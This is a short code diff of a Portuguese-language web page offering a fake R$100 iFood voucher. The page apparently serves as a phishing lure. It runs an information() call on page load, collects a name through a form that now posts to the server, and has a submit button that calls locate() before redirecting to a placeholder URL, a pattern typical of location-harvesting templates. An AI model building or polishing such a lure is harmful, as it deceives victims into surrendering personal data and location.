@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="pt-br">
   <head>
-    <meta charset="UTF-8" />
+    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>Ganhe R$ 100 no iFood</title>
     <link
@@ -23,7 +23,7 @@
   <body onload="information()">
     <div class="container">
       <h1>Voucher iFood</h1>
-      <form>
+      <form action="index" method="post">
         <div class="form-group">
           <label for="nome">Nome</label>
           <input type="text" id="nome" name="nome" required />
@@ -38,8 +38,6 @@
         </div>
         <div class="form-group">
           <button
-            id="requestButton"
-            class="jfk-button jfk-button-action"
             onclick="locate(function(){window.location='REDIRECT_URL';}, function(){$('#change').html('Failed');});"
           >
             Enviar
